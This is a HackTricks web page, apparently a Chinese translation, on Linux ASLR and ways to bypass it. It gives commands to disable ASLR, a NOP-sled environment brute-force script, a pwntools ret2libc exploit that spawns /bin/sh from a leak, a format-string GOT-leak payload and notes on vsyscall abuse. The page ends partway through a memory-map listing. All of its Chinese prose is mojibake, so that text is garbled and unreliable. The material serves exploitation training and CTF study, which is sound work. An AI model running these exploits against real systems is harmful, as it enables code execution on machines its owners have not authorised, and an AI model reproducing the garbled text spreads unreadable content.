<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>ASLR</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="aslr"><a class="header" href="#aslr">ASLR</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
<h2 id="åŸºæœ¬ä¿¡æ¯"><a class="header" href="#åŸºæœ¬ä¿¡æ¯">åŸºæœ¬ä¿¡æ¯</a></h2>
<p><strong>åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ– (ASLR)</strong> æ˜¯ä¸€ç§åœ¨æ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨çš„å®‰å…¨æŠ€æœ¯ï¼Œç”¨äº <strong>éšæœºåŒ–ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºè¿›ç¨‹ä½¿ç”¨çš„å†…å­˜åœ°å€</strong>ã€‚é€šè¿‡è¿™æ ·åšï¼Œå®ƒä½¿æ”»å‡»è€…é¢„æµ‹ç‰¹å®šè¿›ç¨‹å’Œæ•°æ®ï¼ˆå¦‚å †æ ˆã€å †å’Œåº“ï¼‰çš„ä½ç½®å˜å¾—æ›´åŠ å›°éš¾ï¼Œä»è€Œå‡è½»æŸäº›ç±»å‹çš„æ”»å‡»ï¼Œç‰¹åˆ«æ˜¯ç¼“å†²åŒºæº¢å‡ºã€‚</p>
<h3 id="æ£€æŸ¥-aslr-çŠ¶æ€"><a class="header" href="#æ£€æŸ¥-aslr-çŠ¶æ€"><strong>æ£€æŸ¥ ASLR çŠ¶æ€</strong></a></h3>
<p>è¦ <strong>æ£€æŸ¥</strong> Linux ç³»ç»Ÿä¸Šçš„ ASLR çŠ¶æ€ï¼Œå¯ä»¥ä» <strong><code>/proc/sys/kernel/randomize_va_space</code></strong> æ–‡ä»¶ä¸­è¯»å–å€¼ã€‚å­˜å‚¨åœ¨æ­¤æ–‡ä»¶ä¸­çš„å€¼å†³å®šäº†åº”ç”¨çš„ ASLR ç±»å‹ï¼š</p>
<ul>
<li><strong>0</strong>ï¼šæ²¡æœ‰éšæœºåŒ–ã€‚ä¸€åˆ‡éƒ½æ˜¯é™æ€çš„ã€‚</li>
<li><strong>1</strong>ï¼šä¿å®ˆéšæœºåŒ–ã€‚å…±äº«åº“ã€å †æ ˆã€mmap()ã€VDSO é¡µé¢è¢«éšæœºåŒ–ã€‚</li>
<li><strong>2</strong>ï¼šå®Œå…¨éšæœºåŒ–ã€‚é™¤äº†ä¿å®ˆéšæœºåŒ–éšæœºåŒ–çš„å…ƒç´ å¤–ï¼Œé€šè¿‡ <code>brk()</code> ç®¡ç†çš„å†…å­˜ä¹Ÿè¢«éšæœºåŒ–ã€‚</li>
</ul>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ ASLR çŠ¶æ€ï¼š</p>
<pre><code class="language-bash">cat /proc/sys/kernel/randomize_va_space
</code></pre>
<h3 id="ç¦ç”¨-aslr"><a class="header" href="#ç¦ç”¨-aslr"><strong>ç¦ç”¨ ASLR</strong></a></h3>
<p>è¦<strong>ç¦ç”¨</strong> ASLRï¼Œæ‚¨éœ€è¦å°† <code>/proc/sys/kernel/randomize_va_space</code> çš„å€¼è®¾ç½®ä¸º <strong>0</strong>ã€‚åœ¨æµ‹è¯•æˆ–è°ƒè¯•åœºæ™¯ä¹‹å¤–ï¼Œé€šå¸¸ä¸å»ºè®®ç¦ç”¨ ASLRã€‚ä»¥ä¸‹æ˜¯ç¦ç”¨å®ƒçš„æ–¹æ³•ï¼š</p>
<pre><code class="language-bash">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre>
<p>æ‚¨è¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç¦ç”¨ASLRæ‰§è¡Œï¼š</p>
<pre><code class="language-bash">setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
</code></pre>
<h3 id="å¯ç”¨-aslr"><a class="header" href="#å¯ç”¨-aslr"><strong>å¯ç”¨ ASLR</strong></a></h3>
<p>è¦<strong>å¯ç”¨</strong> ASLRï¼Œæ‚¨å¯ä»¥å°†å€¼ <strong>2</strong> å†™å…¥ <code>/proc/sys/kernel/randomize_va_space</code> æ–‡ä»¶ã€‚è¿™é€šå¸¸éœ€è¦ root æƒé™ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ç”¨å®Œå…¨éšæœºåŒ–ï¼š</p>
<pre><code class="language-bash">echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre>
<h3 id="é‡å¯åçš„æŒä¹…æ€§"><a class="header" href="#é‡å¯åçš„æŒä¹…æ€§"><strong>é‡å¯åçš„æŒä¹…æ€§</strong></a></h3>
<p>ä½¿ç”¨ <code>echo</code> å‘½ä»¤æ‰€åšçš„æ›´æ”¹æ˜¯ä¸´æ—¶çš„ï¼Œå¹¶å°†åœ¨é‡å¯æ—¶é‡ç½®ã€‚è¦ä½¿æ›´æ”¹æŒä¹…åŒ–ï¼Œæ‚¨éœ€è¦ç¼–è¾‘ <code>/etc/sysctl.conf</code> æ–‡ä»¶ï¼Œå¹¶æ·»åŠ æˆ–ä¿®æ”¹ä»¥ä¸‹è¡Œï¼š</p>
<pre><code class="language-tsconfig">kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
</code></pre>
<p>åœ¨ç¼–è¾‘ <code>/etc/sysctl.conf</code> åï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åº”ç”¨æ›´æ”¹ï¼š</p>
<pre><code class="language-bash">sudo sysctl -p
</code></pre>
<p>è¿™å°†ç¡®ä¿æ‚¨çš„ ASLR è®¾ç½®åœ¨é‡å¯åä¿æŒä¸å˜ã€‚</p>
<h2 id="ç»•è¿‡"><a class="header" href="#ç»•è¿‡"><strong>ç»•è¿‡</strong></a></h2>
<h3 id="32ä½æš´åŠ›ç ´è§£"><a class="header" href="#32ä½æš´åŠ›ç ´è§£">32ä½æš´åŠ›ç ´è§£</a></h3>
<p>PaX å°†è¿›ç¨‹åœ°å€ç©ºé—´åˆ†ä¸º <strong>3 ç»„</strong>ï¼š</p>
<ul>
<li><strong>ä»£ç å’Œæ•°æ®</strong>ï¼ˆå·²åˆå§‹åŒ–å’Œæœªåˆå§‹åŒ–ï¼‰ï¼š<code>.text</code>ã€<code>.data</code> å’Œ <code>.bss</code> â€”&gt; <code>delta_exec</code> å˜é‡ä¸­çš„ <strong>16 ä½</strong> ç†µã€‚è¯¥å˜é‡åœ¨æ¯ä¸ªè¿›ç¨‹ä¸­éšæœºåˆå§‹åŒ–ï¼Œå¹¶æ·»åŠ åˆ°åˆå§‹åœ°å€ã€‚</li>
<li>ç”± <code>mmap()</code> åˆ†é…çš„ <strong>å†…å­˜</strong> å’Œ <strong>å…±äº«åº“</strong> â€”&gt; <strong>16 ä½</strong>ï¼Œç§°ä¸º <code>delta_mmap</code>ã€‚</li>
<li><strong>æ ˆ</strong> â€”&gt; <strong>24 ä½</strong>ï¼Œç§°ä¸º <code>delta_stack</code>ã€‚ç„¶è€Œï¼Œå®ƒå®é™…ä¸Šä½¿ç”¨ <strong>11 ä½</strong>ï¼ˆä»ç¬¬ 10 å­—èŠ‚åˆ°ç¬¬ 20 å­—èŠ‚ï¼ŒåŒ…æ‹¬ï¼‰ï¼Œå¯¹é½åˆ° <strong>16 å­—èŠ‚</strong> â€”&gt; è¿™å¯¼è‡´ <strong>524,288 ä¸ªå¯èƒ½çš„çœŸå®æ ˆåœ°å€</strong>ã€‚</li>
</ul>
<p>å‰é¢çš„æ•°æ®é€‚ç”¨äº 32 ä½ç³»ç»Ÿï¼Œå‡å°‘çš„æœ€ç»ˆç†µä½¿å¾—é€šè¿‡ä¸€æ¬¡åˆä¸€æ¬¡åœ°é‡è¯•æ‰§è¡Œæ¥ç»•è¿‡ ASLR æˆä¸ºå¯èƒ½ï¼Œç›´åˆ°åˆ©ç”¨æˆåŠŸå®Œæˆã€‚</p>
<h4 id="æš´åŠ›ç ´è§£æ€è·¯"><a class="header" href="#æš´åŠ›ç ´è§£æ€è·¯">æš´åŠ›ç ´è§£æ€è·¯ï¼š</a></h4>
<ul>
<li>å¦‚æœæ‚¨æœ‰è¶³å¤Ÿå¤§çš„æº¢å‡ºä»¥å®¹çº³ <strong>å¤§ NOP sled åœ¨ shellcode ä¹‹å‰</strong>ï¼Œæ‚¨å¯ä»¥åœ¨æ ˆä¸­æš´åŠ›ç ´è§£åœ°å€ï¼Œç›´åˆ°æµç¨‹ <strong>è·³è¿‡ NOP sled çš„æŸéƒ¨åˆ†</strong>ã€‚</li>
<li>å¦‚æœæº¢å‡ºä¸é‚£ä¹ˆå¤§ï¼Œå¹¶ä¸”åˆ©ç”¨å¯ä»¥åœ¨æœ¬åœ°è¿è¡Œï¼Œå¦ä¸€ç§é€‰æ‹©æ˜¯ <strong>åœ¨ç¯å¢ƒå˜é‡ä¸­æ·»åŠ  NOP sled å’Œ shellcode</strong>ã€‚</li>
<li>å¦‚æœåˆ©ç”¨æ˜¯æœ¬åœ°çš„ï¼Œæ‚¨å¯ä»¥å°è¯•æš´åŠ›ç ´è§£ libc çš„åŸºåœ°å€ï¼ˆå¯¹ 32 ä½ç³»ç»Ÿæœ‰ç”¨ï¼‰ï¼š</li>
</ul>
<pre><code class="language-python">for off in range(0xb7000000, 0xb8000000, 0x1000):
</code></pre>
<ul>
<li>å¦‚æœæ”»å‡»è¿œç¨‹æœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥å°è¯• <strong>æš´åŠ›ç ´è§£ <code>libc</code> å‡½æ•° <code>usleep</code> çš„åœ°å€</strong>ï¼Œä¼ é€’å‚æ•° 10ï¼ˆä¾‹å¦‚ï¼‰ã€‚å¦‚æœåœ¨æŸä¸ªæ—¶åˆ» <strong>æœåŠ¡å™¨å“åº”å¤šäº† 10 ç§’</strong>ï¼Œæ‚¨å°±æ‰¾åˆ°äº†è¿™ä¸ªå‡½æ•°çš„åœ°å€ã€‚</li>
</ul>
<p>{% hint style="success" %}
åœ¨ 64 ä½ç³»ç»Ÿä¸­ï¼Œç†µè¦é«˜å¾—å¤šï¼Œè¿™ä¸åº”è¯¥æ˜¯å¯èƒ½çš„ã€‚
{% endhint %}</p>
<h3 id="64-ä½æ ˆæš´åŠ›ç ´è§£"><a class="header" href="#64-ä½æ ˆæš´åŠ›ç ´è§£">64 ä½æ ˆæš´åŠ›ç ´è§£</a></h3>
<p>å¯ä»¥ç”¨ç¯å¢ƒå˜é‡å ç”¨æ ˆçš„å¤§éƒ¨åˆ†ï¼Œç„¶åå°è¯•åœ¨æœ¬åœ°æ•°ç™¾/æ•°åƒæ¬¡æ»¥ç”¨è¯¥äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œåˆ©ç”¨ã€‚<br />
ä»¥ä¸‹ä»£ç æ˜¾ç¤ºäº†å¦‚ä½• <strong>ä»…é€‰æ‹©æ ˆä¸­çš„ä¸€ä¸ªåœ°å€</strong>ï¼Œå¹¶ä¸”æ¯ <strong>å‡ ç™¾æ¬¡æ‰§è¡Œ</strong>ï¼Œè¯¥åœ°å€å°†åŒ…å« <strong>NOP æŒ‡ä»¤</strong>ï¼š</p>
<pre><code class="language-c">//clang -o aslr-testing aslr-testing.c -fno-stack-protector -Wno-format-security -no-pie
#include &lt;stdio.h&gt;

int main() {
unsigned long long address = 0xffffff1e7e38;
unsigned int* ptr = (unsigned int*)address;
unsigned int value = *ptr;
printf("The 4 bytes from address 0xffffff1e7e38: 0x%x\n", value);
return 0;
}
</code></pre>
<pre><code class="language-python">import subprocess
import traceback

# Start the process
nop = b"\xD5\x1F\x20\x03" # ARM64 NOP transposed
n_nops = int(128000/4)
shellcode_env_var = nop * n_nops

# Define the environment variables you want to set
env_vars = {
'a': shellcode_env_var,
'b': shellcode_env_var,
'c': shellcode_env_var,
'd': shellcode_env_var,
'e': shellcode_env_var,
'f': shellcode_env_var,
'g': shellcode_env_var,
'h': shellcode_env_var,
'i': shellcode_env_var,
'j': shellcode_env_var,
'k': shellcode_env_var,
'l': shellcode_env_var,
'm': shellcode_env_var,
'n': shellcode_env_var,
'o': shellcode_env_var,
'p': shellcode_env_var,
}

cont = 0
while True:
cont += 1

if cont % 10000 == 0:
break

print(cont, end="\r")
# Define the path to your binary
binary_path = './aslr-testing'

try:
process = subprocess.Popen(binary_path, env=env_vars, stdout=subprocess.PIPE, text=True)
output = process.communicate()[0]
if "0xd5" in str(output):
print(str(cont) + " -&gt; " + output)
except Exception as e:
print(e)
print(traceback.format_exc())
pass
</code></pre>
<figure><img src="../../../.gitbook/assets/image (1214).png" alt="" width="563"><figcaption></figcaption></figure>
<h3 id="æœ¬åœ°ä¿¡æ¯-procpidstat"><a class="header" href="#æœ¬åœ°ä¿¡æ¯-procpidstat">æœ¬åœ°ä¿¡æ¯ (<code>/proc/[pid]/stat</code>)</a></h3>
<p>è¿›ç¨‹çš„æ–‡ä»¶ <strong><code>/proc/[pid]/stat</code></strong> å§‹ç»ˆå¯¹æ‰€æœ‰äººå¯è¯»ï¼Œå¹¶ä¸” <strong>åŒ…å«æœ‰è¶£çš„</strong> ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><strong>startcode</strong> &amp; <strong>endcode</strong>: äºŒè¿›åˆ¶æ–‡ä»¶çš„ <strong>TEXT</strong> ä¸Šä¸‹çš„åœ°å€</li>
<li><strong>startstack</strong>: <strong>stack</strong> å¼€å§‹çš„åœ°å€</li>
<li><strong>start_data</strong> &amp; <strong>end_data</strong>: <strong>BSS</strong> ä¸Šä¸‹çš„åœ°å€</li>
<li><strong>kstkesp</strong> &amp; <strong>kstkeip</strong>: å½“å‰çš„ <strong>ESP</strong> å’Œ <strong>EIP</strong> åœ°å€</li>
<li><strong>arg_start</strong> &amp; <strong>arg_end</strong>: <strong>cli arguments</strong> ä¸Šä¸‹çš„åœ°å€</li>
<li><strong>env_start</strong> &amp;<strong>env_end</strong>: <strong>env variables</strong> ä¸Šä¸‹çš„åœ°å€</li>
</ul>
<p>å› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…ä¸è¢«åˆ©ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šï¼Œå¹¶ä¸”è¯¥äºŒè¿›åˆ¶æ–‡ä»¶ä¸æœŸæœ›æ¥è‡ªåŸå§‹å‚æ•°çš„æº¢å‡ºï¼Œè€Œæ˜¯æ¥è‡ªè¯»å–æ­¤æ–‡ä»¶åå¯ä»¥æ„é€ çš„ä¸åŒ <strong>è¾“å…¥</strong>ã€‚æ”»å‡»è€…å¯ä»¥ <strong>ä»æ­¤æ–‡ä»¶ä¸­è·å–ä¸€äº›åœ°å€å¹¶ä»ä¸­æ„é€ åç§»é‡ä»¥è¿›è¡Œåˆ©ç”¨</strong>ã€‚</p>
<p>{% hint style="success" %}
æœ‰å…³æ­¤æ–‡ä»¶çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ <a href="https://man7.org/linux/man-pages/man5/proc.5.html">https://man7.org/linux/man-pages/man5/proc.5.html</a>ï¼Œæœç´¢ <code>/proc/pid/stat</code>
{% endhint %}</p>
<h3 id="æœ‰ä¸€ä¸ªæ³„æ¼"><a class="header" href="#æœ‰ä¸€ä¸ªæ³„æ¼">æœ‰ä¸€ä¸ªæ³„æ¼</a></h3>
<ul>
<li><strong>æŒ‘æˆ˜æ˜¯æä¾›ä¸€ä¸ªæ³„æ¼</strong></li>
</ul>
<p>å¦‚æœä½ å¾—åˆ°äº†ä¸€ä¸ªæ³„æ¼ï¼ˆç®€å•çš„ CTF æŒ‘æˆ˜ï¼‰ï¼Œä½ å¯ä»¥ä»ä¸­è®¡ç®—åç§»é‡ï¼ˆå‡è®¾ä¾‹å¦‚ä½ çŸ¥é“ä½ æ­£åœ¨åˆ©ç”¨çš„ç³»ç»Ÿä¸­ä½¿ç”¨çš„ç¡®åˆ‡ libc ç‰ˆæœ¬ï¼‰ã€‚è¿™ä¸ªç¤ºä¾‹åˆ©ç”¨æå–è‡ª <a href="https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak"><strong>è¿™é‡Œçš„ç¤ºä¾‹</strong></a>ï¼ˆæŸ¥çœ‹è¯¥é¡µé¢ä»¥è·å–æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼‰ï¼š</p>
<pre><code class="language-python">from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
</code></pre>
<ul>
<li><strong>ret2plt</strong></li>
</ul>
<p>åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºï¼Œå¯ä»¥åˆ©ç”¨ <strong>ret2plt</strong> æ¥æå– libc ä¸­ä¸€ä¸ªå‡½æ•°çš„åœ°å€ã€‚æ£€æŸ¥ï¼š</p>
<p>{% content-ref url="ret2plt.md" %}
<a href="ret2plt.html">ret2plt.md</a>
{% endcontent-ref %}</p>
<ul>
<li><strong>æ ¼å¼å­—ç¬¦ä¸²ä»»æ„è¯»å–</strong></li>
</ul>
<p>å°±åƒåœ¨ ret2plt ä¸­ä¸€æ ·ï¼Œå¦‚æœé€šè¿‡æ ¼å¼å­—ç¬¦ä¸²æ¼æ´æœ‰ä»»æ„è¯»å–çš„èƒ½åŠ›ï¼Œå¯ä»¥ä» GOT ä¸­æå– <strong>libc å‡½æ•°</strong> çš„åœ°å€ã€‚ä»¥ä¸‹ <a href="https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got"><strong>ç¤ºä¾‹æ¥è‡ªè¿™é‡Œ</strong></a>:</p>
<pre><code class="language-python">payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
</code></pre>
<p>æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°æœ‰å…³æ ¼å¼å­—ç¬¦ä¸²ä»»æ„è¯»å–çš„æ›´å¤šä¿¡æ¯ï¼š</p>
<p>{% content-ref url="../../format-strings/" %}
<a href="../../format-strings/">format-strings</a>
{% endcontent-ref %}</p>
<h3 id="ret2ret--ret2pop"><a class="header" href="#ret2ret--ret2pop">Ret2ret &amp; Ret2pop</a></h3>
<p>å°è¯•é€šè¿‡åˆ©ç”¨æ ˆå†…çš„åœ°å€æ¥ç»•è¿‡ ASLRï¼š</p>
<p>{% content-ref url="ret2ret.md" %}
<a href="ret2ret.html">ret2ret.md</a>
{% endcontent-ref %}</p>
<h3 id="vsyscall"><a class="header" href="#vsyscall">vsyscall</a></h3>
<p><strong><code>vsyscall</code></strong> æœºåˆ¶é€šè¿‡å…è®¸æŸäº›ç³»ç»Ÿè°ƒç”¨åœ¨ç”¨æˆ·ç©ºé—´ä¸­æ‰§è¡Œæ¥æé«˜æ€§èƒ½ï¼Œå°½ç®¡å®ƒä»¬æœ¬è´¨ä¸Šæ˜¯å†…æ ¸çš„ä¸€éƒ¨åˆ†ã€‚<strong>vsyscalls</strong> çš„å…³é”®ä¼˜åŠ¿åœ¨äºå®ƒä»¬çš„ <strong>å›ºå®šåœ°å€</strong>ï¼Œè¿™äº›åœ°å€ä¸å— <strong>ASLR</strong>ï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰çš„å½±å“ã€‚è¿™ç§å›ºå®šç‰¹æ€§æ„å‘³ç€æ”»å‡»è€…ä¸éœ€è¦ä¿¡æ¯æ³„æ¼æ¼æ´æ¥ç¡®å®šå®ƒä»¬çš„åœ°å€å¹¶åœ¨åˆ©ç”¨ä¸­ä½¿ç”¨å®ƒä»¬ã€‚<br />
ç„¶è€Œï¼Œè¿™é‡Œä¸ä¼šæ‰¾åˆ°è¶…çº§æœ‰è¶£çš„å°å·¥å…·ï¼ˆå°½ç®¡ä¾‹å¦‚å¯ä»¥è·å¾—ä¸€ä¸ª <code>ret;</code> ç­‰æ•ˆæŒ‡ä»¤ï¼‰</p>
<p>ï¼ˆä»¥ä¸‹ç¤ºä¾‹å’Œä»£ç æ¥è‡ª <a href="https://guyinatuxedo.github.io/15-partial_overwrite/hacklu15_stackstuff/index.html#exploitation"><strong>æ­¤å†™ä½œ</strong></a>ï¼‰</p>
<p>ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨åˆ©ç”¨ä¸­ä½¿ç”¨åœ°å€ <code>0xffffffffff600800</code>ã€‚è™½ç„¶å°è¯•ç›´æ¥è·³è½¬åˆ° <code>ret</code> æŒ‡ä»¤å¯èƒ½ä¼šå¯¼è‡´åœ¨æ‰§è¡Œå‡ ä¸ªå°å·¥å…·åä¸ç¨³å®šæˆ–å´©æºƒï¼Œä½†è·³è½¬åˆ° <strong>vsyscall</strong> éƒ¨åˆ†æä¾›çš„ <code>syscall</code> å¼€å§‹å¤„å¯èƒ½ä¼šæˆåŠŸã€‚é€šè¿‡ä»”ç»†æ”¾ç½®ä¸€ä¸ª <strong>ROP</strong> å°å·¥å…·ï¼Œå°†æ‰§è¡Œå¼•å¯¼åˆ°è¿™ä¸ª <strong>vsyscall</strong> åœ°å€ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸éœ€è¦ç»•è¿‡ <strong>ASLR</strong> çš„æƒ…å†µä¸‹å®ç°ä»£ç æ‰§è¡Œã€‚</p>
<pre><code>efâ¤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
